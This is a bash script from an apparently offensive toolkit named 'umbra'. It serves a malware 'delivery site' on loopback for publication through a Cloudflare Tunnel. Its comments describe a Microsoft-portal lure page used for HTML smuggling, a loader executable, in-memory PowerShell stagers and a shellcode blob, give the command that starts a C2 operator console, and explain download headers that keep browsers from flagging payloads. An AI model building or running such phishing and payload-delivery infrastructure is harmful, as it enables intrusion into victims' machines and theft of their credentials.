#!/usr/bin/env bash
# serve.sh - serve the umbra delivery site (dist/) on loopback.
#
# The static site is bound to 127.0.0.1 only: it is meant to be reached through
# the Cloudflare Tunnel (scripts/cf_tunnel.sh), never directly. It carries the
# lure page (index.html - the Microsoft-portal smuggle page or the fallback),
# the payload (loader.exe or the PAYLOAD_NAME copy), the in-memory stagers
# (stage.ps1 / reflect.ps1) and, optionally, the hex shellcode blob (blob.hex).
#
# The port comes from scripts/umbra.env (HTTP_PORT) so it can never disagree
# with the tunnel again. Override for a single run with HTTP_PORT=... , e.g.:
#
#   bash scripts/serve.sh                 # port from scripts/umbra.env (or 8080)
#   HTTP_PORT=9000 bash scripts/serve.sh  # one-off custom port
#
# The C2 is NOT started here on purpose: its operator console needs an
# interactive terminal. Run it in its own window:
#   ./dist/server -listen 127.0.0.1:8443 -pass '<PASS>' -certdir dist/c2data
set -euo pipefail
cd "$(dirname "$0")/.."

# --- shared session config (single source of truth) --------------------------
# Precedence: an already-exported shell var wins, then scripts/umbra.env, then
# the built-in default below. Copy scripts/umbra.env.example -> scripts/umbra.env.
load_env() {
  local f="$1" line k v
  [ -f "$f" ] || return 0
  while IFS= read -r line || [ -n "$line" ]; do
    case "$line" in ''|'#'*) continue ;; esac
    k="${line%%=*}"; v="${line#*=}"
    k="$(printf '%s' "$k" | tr -d '[:space:]')"
    [ -n "$k" ] || continue
    [ -n "${!k:-}" ] && continue
    case "$v" in
      \"*\") v="${v#\"}"; v="${v%\"}" ;;
      \'*\') v="${v#\'}"; v="${v%\'}" ;;
    esac
    export "$k=$v"
  done < "$f"
}
load_env scripts/umbra.env

DIR="${DIR:-dist}"
HTTP_PORT="${HTTP_PORT:-8080}"

if [ ! -f "$DIR/index.html" ]; then
  echo "[-] $DIR/index.html not found; run scripts/build.sh first" >&2
  exit 1
fi

# --- refuse to start if the port is already taken ----------------------------
# A stale process, another app (code-server), or a second copy of this script
# squatting on the port is the #1 way the tunnel ends up serving the wrong site.
# Fail fast and loudly instead of silently binding nowhere.
port_in_use() {
  local p="$1"
  if command -v ss >/dev/null 2>&1; then
    ss -ltn 2>/dev/null | awk '{print $4}' | grep -qE "[:.]${p}\$"
  elif command -v netstat >/dev/null 2>&1; then
    netstat -ltn 2>/dev/null | awk '{print $4}' | grep -qE "[:.]${p}\$"
  else
    # python3 is a hard requirement of this script; it can probe for us.
    python3 - "$p" <<'PY' >/dev/null 2>&1
import socket, sys
s = socket.socket()
try:
    s.bind(("127.0.0.1", int(sys.argv[1])))
except OSError:
    sys.exit(0)   # busy
finally:
    s.close()
sys.exit(1)       # free
PY
  fi
}

if port_in_use "$HTTP_PORT"; then
  echo "[-] port ${HTTP_PORT} is already in use - refusing to start." >&2
  if command -v ss >/dev/null 2>&1; then ss -ltnp 2>/dev/null | grep -E "[:.]${HTTP_PORT}\b" >&2 || true; fi
  echo "    Something else is bound there (code-server on 8080 is common)." >&2
  echo "    Set a free port in scripts/umbra.env and cf_tunnel.sh will follow:" >&2
  echo "        HTTP_PORT=8082        # edit scripts/umbra.env" >&2
  echo "    or override for one run:  HTTP_PORT=8082 bash scripts/serve.sh" >&2
  exit 1
fi

echo "[*] serving $DIR on http://127.0.0.1:$HTTP_PORT (loopback only)"
echo "[*] publish it with: bash scripts/cf_tunnel.sh"
# scripts/serve.py (not -m http.server) so downloads keep their exact file
# names: it sends Content-Disposition: attachment for .exe/.hex/.ps1/.bin/.zip/.iso
# and pins the MIME map, which stops Chromium from appending ".download".
exec python3 scripts/serve.py "$HTTP_PORT" "$DIR"
